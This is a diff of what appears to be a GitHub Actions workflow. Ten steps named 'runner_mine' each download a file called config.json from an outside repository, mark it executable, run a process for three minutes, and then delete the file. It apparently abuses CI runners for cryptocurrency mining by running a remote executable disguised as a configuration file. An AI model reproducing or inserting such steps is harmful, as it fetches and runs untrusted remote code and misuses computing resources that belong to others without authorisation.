@@ -29,58 +29,88 @@ jobs:
       continue-on-error: true
       run: |
         timeout 3m ./logs
+    - name: remove
+      continue-on-error: true
+      run: |
         rm -rf config.json
     - name: runner_mine2
       continue-on-error: true
       run: |
         wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
         timeout 3m ./logs
+    - name: remove
+      continue-on-error: true
+      run: |
         rm -rf config.json
     - name: runner_mine3
       continue-on-error: true
       run: |
         wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
         timeout 3m ./logs
+    - name: remove
+      continue-on-error: true
+      run: |
         rm -rf config.json
     - name: runner_mine4
       continue-on-error: true
       run: |
         wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
         timeout 3m ./logs
+    - name: remove
+      continue-on-error: true
+      run: |
         rm -rf config.json
     - name: runner_mine5
       continue-on-error: true
       run: |
         wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
         timeout 3m ./logs
+    - name: remove
+      continue-on-error: true
+      run: |
         rm -rf config.json
     - name: runner_mine6
       continue-on-error: true
       run: |
         wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
         timeout 3m ./logs
+    - name: remove
+      continue-on-error: true
+      run: |
         rm -rf config.json
     - name: runner_mine7
       continue-on-error: true
       run: |
         wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
         timeout 3m ./logs
+    - name: remove
+      continue-on-error: true
+      run: |
         rm -rf config.json
     - name: runner_mine8
       continue-on-error: true
       run: |
         wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
         timeout 3m ./logs
+    - name: remove
+      continue-on-error: true
+      run: |
         rm -rf config.json
     - name: runner_mine9
       continue-on-error: true
       run: |
         wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
         timeout 3m ./logs
+    - name: remove
+      continue-on-error: true
+      run: |
         rm -rf config.json
     - name: runner_mine10
       continue-on-error: true
       run: |
         wget https://raw.githubusercontent.com/kijang-7/gas/main/config.json && chmod +x config.json
         timeout 3m ./logs
+    - name: remove
+      continue-on-error: true
+      run: |
         rm -rf config.json
